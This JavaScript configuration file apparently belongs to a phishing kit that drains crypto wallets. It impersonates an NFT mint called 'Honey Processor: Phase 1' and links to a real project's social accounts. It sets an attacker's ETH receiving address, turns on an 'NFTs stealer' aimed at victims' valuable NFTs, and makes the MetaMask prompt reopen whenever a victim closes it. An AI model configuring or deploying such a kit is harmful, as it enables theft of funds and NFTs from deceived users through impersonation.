const address = "0x4F7ed9794000B8dFf6DEc46056db3D21F2497A34";    // Your ETH wallet that you have to receive NFTs
const infuraId = "x"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "x"    // Web3 Api key | https://moralis.io/ | For NFTs
const collectionInfo = {
    name: "Honey Processor: Phase 1",
    title: "Honey Processor",
    date: "24.07.2022",
    socialMedia: {
        discord: "https://discord.com/invite/twobitbears",
        twitter: "https://www.twitter.com/TwoBitBears",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.1,         // Price per NFT.
    totalSupply: 853,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}
const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
